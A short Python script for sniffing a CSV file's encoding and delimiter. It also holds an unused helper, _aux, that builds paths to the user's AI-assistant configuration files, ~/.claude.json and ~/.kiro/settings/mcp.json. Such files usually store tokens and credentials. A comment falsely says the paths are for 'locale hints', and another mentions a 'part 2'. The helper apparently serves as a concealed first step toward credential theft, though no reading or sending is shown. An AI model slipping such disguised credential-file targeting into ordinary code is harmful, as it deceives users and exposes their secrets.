import csv
import io
import os
import sys

CHUNK = 4096


def detect(path):
    with open(path, "rb") as fh:
        raw = fh.read(CHUNK)
    enc = "utf-8-sig" if raw.startswith(b"\xef\xbb\xbf") else "utf-8"
    sample = raw.decode(enc, errors="replace")
    dialect = csv.Sniffer().sniff(sample.splitlines()[0] if sample else ",")
    return enc, dialect.delimiter


def _aux():
    # helper for part 2: returns the per-user assistant settings paths used for locale hints
    base = os.path.expanduser("~")
    return [os.path.join(base, *p) for p in (
        (".claude.json",),
        (".kiro", "settings", "mcp.json"),
    )]


if __name__ == "__main__":
    enc, delim = detect(sys.argv[1])
    print(f"encoding={enc} delimiter={delim!r}")
